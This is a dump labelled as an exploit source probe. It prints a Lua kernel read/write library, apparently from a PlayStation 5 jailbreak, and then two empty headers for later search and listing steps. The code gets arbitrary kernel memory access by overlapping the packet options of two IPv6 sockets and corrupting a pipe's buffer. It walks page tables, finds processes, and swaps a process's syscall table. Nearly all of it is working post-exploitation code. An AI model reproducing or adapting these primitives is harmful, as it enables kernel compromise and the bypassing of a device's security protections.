@@ -1,0 +1,479 @@
+=== PROBE p584: Full Exploit Source Dump ===
+
+[A] === /savedata0/kernel.lua ===
+1:
+2:-- class for kernel memory r/w
+3:
+4:kernel = {}
+5:
+6:kernel.addr = {}
+7:
+8:-- these vars need to be defined for other fns to work properly
+9:kernel.copyout = nil
+10:kernel.copyin = nil
+11:kernel.read_buffer = nil
+12:kernel.write_buffer = nil
+13:
+14:function kernel.read_byte(kaddr)
+15:    local value = kernel.read_buffer(kaddr, 1)
+16:    return value and #value == 1 and uint64.unpack(value) or nil 
+17:end
+18:
+19:function kernel.read_word(kaddr)
+20:    local value = kernel.read_buffer(kaddr, 2)
+21:    return value and #value == 2 and uint64.unpack(value) or nil 
+22:end
+23:
+24:function kernel.read_dword(kaddr)
+25:    local value = kernel.read_buffer(kaddr, 4)
+26:    return value and #value == 4 and uint64.unpack(value) or nil 
+27:end
+28:
+29:function kernel.read_qword(kaddr)
+30:    local value = kernel.read_buffer(kaddr, 8)
+31:    return value and #value == 8 and uint64.unpack(value) or nil 
+32:end
+33:
+34:function kernel.hex_dump(kaddr, size)
+35:    size = size or 0x40
+36:    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
+37:end
+38:
+39:function kernel.read_null_terminated_string(kaddr)
+40:    
+41:    local result = ""
+42:
+43:    while true do
+44:        local chunk = kernel.read_buffer(kaddr, 0x8)
+45:        local null_pos = chunk:find("\0")
+46:        if null_pos then 
+47:            return result .. chunk:sub(1, null_pos - 1)
+48:        end
+49:        result = result .. chunk
+50:        kaddr = kaddr + #chunk
+51:    end
+52:    
+53:    if string.byte(result[1]) == 0 then
+54:        return nil
+55:    end
+56:
+57:    return result
+58:end
+59:
+60:function kernel.write_byte(dest, value)
+61:    kernel.write_buffer(dest, ub8(value):sub(1,1))
+62:end
+63:
+64:function kernel.write_word(dest, value)
+65:    kernel.write_buffer(dest, ub8(value):sub(1,2))
+66:end
+67:
+68:function kernel.write_dword(dest, value)
+69:    kernel.write_buffer(dest, ub8(value):sub(1,4))
+70:end
+71:
+72:function kernel.write_qword(dest, value)
+73:    kernel.write_buffer(dest, ub8(value):sub(1,8))
+74:end
+75:
+76:
+77:
+78:
+79:
+80:-- provide fast kernel r/w through pipe pair & ipv6
+81:
+82:ipv6_kernel_rw = {}
+83:
+84:ipv6_kernel_rw.data = {}
+85:
+86:function ipv6_kernel_rw.init(ofiles, kread8, kwrite8)
+87:
+88:    ipv6_kernel_rw.ofiles = ofiles
+89:    ipv6_kernel_rw.kread8 = kread8
+90:    ipv6_kernel_rw.kwrite8 = kwrite8
+91:
+92:    ipv6_kernel_rw.create_pipe_pair()
+93:    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
+94:end
+95:
+96:function ipv6_kernel_rw.get_fd_data_addr(fd)
+97:    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * kernel_offset.SIZEOF_OFILES
+98:    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0) -- fde_file
+99:    return ipv6_kernel_rw.kread8(file_addr + 0x0) -- f_data
+100:end
+101:
+102:function ipv6_kernel_rw.create_pipe_pair()
+103:
+104:    local read_fd, write_fd = create_pipe()
+105:    
+106:    ipv6_kernel_rw.data.pipe_read_fd = read_fd
+107:    ipv6_kernel_rw.data.pipe_write_fd = write_fd
+108:    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
+109:    ipv6_kernel_rw.data.pipemap_buffer = memory.alloc(0x14)
+110:    ipv6_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
+111:end
+112:
+113:-- overlap the pktopts of two IPV6 sockets
+114:function ipv6_kernel_rw.create_overlapped_ipv6_sockets()
+115:
+116:    local master_target_buffer = memory.alloc(0x14)
+117:    local slave_buffer = memory.alloc(0x14)
+118:    local pktinfo_size_store = memory.alloc(0x8)
+119:    
+120:    memory.write_qword(pktinfo_size_store, 0x14)
+121:
+122:    local master_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+123:    local victim_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+124:
+125:    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
+126:    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)
+127:
+128:    local master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
+129:    local master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB)
+130:    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS)
+131:
+132:    local slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
+133:    local slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB)
+134:    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS)
+135:
+136:    -- magic
+137:    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)
+138:
+139:    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
+140:    ipv6_kernel_rw.data.slave_buffer = slave_buffer
+141:    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
+142:    ipv6_kernel_rw.data.master_sock = master_sock
+143:    ipv6_kernel_rw.data.victim_sock = victim_sock
+144:end
+145:
+146:function ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+147:    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer, kaddr)
+148:    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer + 0x8, 0)
+149:    memory.write_dword(ipv6_kernel_rw.data.master_target_buffer + 0x10, 0)
+150:    syscall.setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
+151:end
+152:
+153:function ipv6_kernel_rw.ipv6_kread(kaddr, buffer_addr)
+154:    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+155:    syscall.getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
+156:end
+157:
+158:function ipv6_kernel_rw.ipv6_kwrite(kaddr, buffer_addr)
+159:    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+160:    syscall.setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
+161:end
+162:
+163:function ipv6_kernel_rw.ipv6_kread8(kaddr)
+164:    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
+165:    return memory.read_qword(ipv6_kernel_rw.data.slave_buffer)
+166:end
+167:
+168:function ipv6_kernel_rw.copyout(kaddr, uaddr, len)
+169:
+170:    assert(kaddr and uaddr and len)
+171:
+172:    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, uint64("0x4000000040000000"))
+173:    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
+174:    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+175:    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
+176:
+177:    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
+178:    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
+179:    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+180:    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
+181:    
+182:    syscall.read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
+183:end
+184:
+185:function ipv6_kernel_rw.copyin(uaddr, kaddr, len)
+186:
+187:    assert(kaddr and uaddr and len)
+188:
+189:    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, 0)
+190:    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
+191:    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+192:    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
+193:
+194:    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
+195:    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
+196:    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+197:    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
+198:
+199:    syscall.write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
+200:end
+201:
+202:function ipv6_kernel_rw.read_buffer(kaddr, len)
+203:
+204:    local mem = ipv6_kernel_rw.data.read_mem
+205:    if len > PAGE_SIZE then
+206:        mem = memory.alloc(len)
+207:    end
+208:
+209:    ipv6_kernel_rw.copyout(kaddr, mem, len)
+210:    return memory.read_buffer(mem, len)
+211:end
+212:
+213:function ipv6_kernel_rw.write_buffer(kaddr, buf)
+214:    ipv6_kernel_rw.copyin(lua.resolve_value(buf), kaddr, #buf)
+215:end
+216:
+217:
+218:
+219:
+220:
+221:-- cpu page table
+222:
+223:CPU_PDE_SHIFT = {
+224:    PRESENT = 0,
+225:    RW = 1,
+226:    USER = 2,
+227:    WRITE_THROUGH = 3,
+228:    CACHE_DISABLE = 4,
+229:    ACCESSED = 5,
+230:    DIRTY = 6,
+231:    PS = 7,
+232:    GLOBAL = 8,
+233:    XOTEXT = 58,
+234:    PROTECTION_KEY = 59,
+235:    EXECUTE_DISABLE = 63
+236:}
+237:
+238:CPU_PDE_MASKS = {
+239:    PRESENT = 1,
+240:    RW = 1,
+241:    USER = 1,
+242:    WRITE_THROUGH = 1,
+243:    CACHE_DISABLE = 1,
+244:    ACCESSED = 1,
+245:    DIRTY = 1,
+246:    PS = 1,
+247:    GLOBAL = 1,
+248:    XOTEXT = 1,
+249:    PROTECTION_KEY = 0xf,
+250:    EXECUTE_DISABLE = 1
+251:}
+252:
+253:CPU_PG_PHYS_FRAME = uint64("0x000ffffffffff000")
+254:CPU_PG_PS_FRAME = uint64("0x000fffffffe00000")
+255:
+256:function cpu_pde_field(pde, field)
+257:    local shift = CPU_PDE_SHIFT[field]
+258:    local mask = CPU_PDE_MASKS[field]
+259:    return bit64.band(bit64.rshift(pde, shift), mask):tonumber()
+260:end
+261:
+262:function cpu_walk_pt(cr3, vaddr)
+263:
+264:    assert(vaddr, cr3)
+265:
+266:    local pml4e_index = bit64.band(bit64.rshift(vaddr, 39), 0x1ff)
+267:    local pdpe_index = bit64.band(bit64.rshift(vaddr, 30), 0x1ff)
+268:    local pde_index = bit64.band(bit64.rshift(vaddr, 21), 0x1ff)
+269:    local pte_index = bit64.band(bit64.rshift(vaddr, 12), 0x1ff)
+270:
+271:    -- pml4
+272:
+273:    local pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8)
+274:    if cpu_pde_field(pml4e, "PRESENT") ~= 1 then
+275:        return nil
+276:    end
+277:
+278:    -- pdp
+279:
+280:    local pdp_base_pa = bit64.band(pml4e, CPU_PG_PHYS_FRAME)
+281:    local pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8
+282:    local pdpe = kernel.read_qword(pdpe_va)
+283:
+284:    if cpu_pde_field(pdpe, "PRESENT") ~= 1 then
+285:        return nil
+286:    end
+287:
+288:    -- pd
+289:
+290:    local pd_base_pa = bit64.band(pdpe, CPU_PG_PHYS_FRAME)
+291:    local pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8
+292:    local pde = kernel.read_qword(pde_va)
+293:
+294:    if cpu_pde_field(pde, "PRESENT") ~= 1 then
+295:        return nil
+296:    end
+297:
+298:    -- large page
+299:    if cpu_pde_field(pde, "PS") == 1 then
+300:        return bit64.bor(
+301:            bit64.band(pde, CPU_PG_PS_FRAME),
+302:            bit64.band(vaddr, 0x1fffff)
+303:        )
+304:    end
+305:
+306:    -- pt
+307:
+308:    local pt_base_pa = bit64.band(pde, CPU_PG_PHYS_FRAME)
+309:    local pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
+310:    local pte = kernel.read_qword(pte_va)
+311:
+312:    if cpu_pde_field(pte, "PRESENT") ~= 1 then
+313:        return nil
+314:    end
+315:
+316:    return bit64.bor(
+317:        bit64.band(pte, CPU_PG_PHYS_FRAME),
+318:        bit64.band(vaddr, 0x3fff)
+319:    )
+320:end
+321:
+322:
+323:
+324:
+325:
+326:-- setup kernel r/w for the loader
+327:function initialize_kernel_rw()
+328:
+329:    local state = storage.get("kernel_rw")
+330:    if state then
+331:
+332:        -- copy ipv6 states given by the exploit
+333:        ipv6_kernel_rw.data = state.ipv6_kernel_rw_data
+334:        
+335:        -- copy existing resolved addresses from exploit
+336:        kernel.addr = state.kernel_addr
+337:        
+338:        -- enable kernel r/w through ipv6 + pipe
+339:        kernel.copyout = ipv6_kernel_rw.copyout
+340:        kernel.copyin = ipv6_kernel_rw.copyin
+341:        kernel.read_buffer = ipv6_kernel_rw.read_buffer
+342:        kernel.write_buffer = ipv6_kernel_rw.write_buffer
+343:
+344:        kernel.rw_initialized = true
+345:
+346:        update_kernel_offsets()
+347:    end
+348:end
+349:
+350:
+351:function is_kernel_rw_available()
+352:    return kernel.read_buffer and kernel.write_buffer
+353:end
+354:
+355:function check_kernel_rw()
+356:    if not is_kernel_rw_available() then
+357:        error("kernel r/w is not available")
+358:    end
+359:end
+360:
+361:
+362:-- useful functions
+363:
+364:function find_proc_by_name(name)
+365:
+366:    check_kernel_rw()
+367:    assert(kernel.addr.allproc)
+368:
+369:    local proc = kernel.read_qword(kernel.addr.allproc)
+370:    while proc ~= uint64(0) do
+371:
+372:        local proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM)
+373:        if proc_name == name then
+374:            return proc
+375:        end
+376:
+377:        proc = kernel.read_qword(proc + 0x0) -- le_next
+378:    end
+379:
+380:    return nil
+381:end
+382:
+383:
+384:function find_proc_by_pid(pid)
+385:
+386:    check_kernel_rw()
+387:    assert(kernel.addr.allproc)
+388:
+389:    assert(type(pid) == "number")
+390:
+391:    local proc = kernel.read_qword(kernel.addr.allproc)
+392:    while proc ~= uint64(0) do
+393:
+394:        local proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID):tonumber()
+395:        if proc_pid == pid then
+396:            return proc
+397:        end
+398:
+399:        proc = kernel.read_qword(proc + 0x0) -- le_next
+400:    end
+401:
+402:    return nil
+403:end
+404:
+405:
+406:function get_proc_cr3(proc)
+407:    
+408:    check_kernel_rw()
+409:    
+410:    local vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE)
+411:    local pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP)
+412:    
+413:    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3)
+414:end
+415:
+416:-- translate virtual address to physical address
+417:-- note: use kernel page table if cr3 is not given
+418:function virt_to_phys(virt_addr, cr3)
+419:    
+420:    check_kernel_rw()
+421:    assert(kernel.addr.dmap_base and virt_addr)
+422:    
+423:    cr3 = cr3 or kernel.addr.kernel_cr3
+424:    return cpu_walk_pt(cr3, virt_addr)
+425:end
+426:
+427:
+428:function phys_to_dmap(phys_addr)
+429:    assert(kernel.addr.dmap_base and phys_addr)
+430:    return kernel.addr.dmap_base + phys_addr
+431:end
+432:
+433:
+434:-- replace curproc sysent with sysent of other ps5 process
+435:-- note: failure to restore curproc sysent will have side effect on the game/ps
+436:function run_with_ps5_syscall_enabled(f)
+437:
+438:    check_kernel_rw()
+439:
+440:    local target_proc_name = "SceGameLiveStreaming" -- arbitrarily chosen ps5 process
+441:
+442:    local target_proc = find_proc_by_name(target_proc_name) 
+443:    if not target_proc then
+444:        errorf("failed to find proc addr of %s", target_proc_name)
+445:    end
+446:
+447:    local cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT)  -- struct sysentvec
+448:    local target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT)
+449:
+450:    local cur_table_size = kernel.read_dword(cur_sysent) -- sv_size
+451:    local target_table_size = kernel.read_dword(target_sysent)
+452:
+453:    local cur_table = kernel.read_qword(cur_sysent + 0x8) -- sv_table
+454:    local target_table = kernel.read_qword(target_sysent + 0x8)
+455:
+456:    -- replace with target sysent
+457:    kernel.write_dword(cur_sysent, target_table_size)
+458:    kernel.write_qword(cur_sysent + 0x8, target_table)
+459:
+460:    -- catch lua error so we can restore sysent
+461:    local err = run_with_coroutine(f)
+462:    if err then
+463:        print(err)
+464:    end
+465:    
+466:    -- restore back
+467:    kernel.write_dword(cur_sysent, cur_table_size)
+468:    kernel.write_qword(cur_sysent + 0x8, cur_table) 
+469:end
+470:
+
+[B] Searching for ipv6 exploit source...
+
+[C] Listing /savedata0/ files...
+
+=== PROBE p584 COMPLETE ===
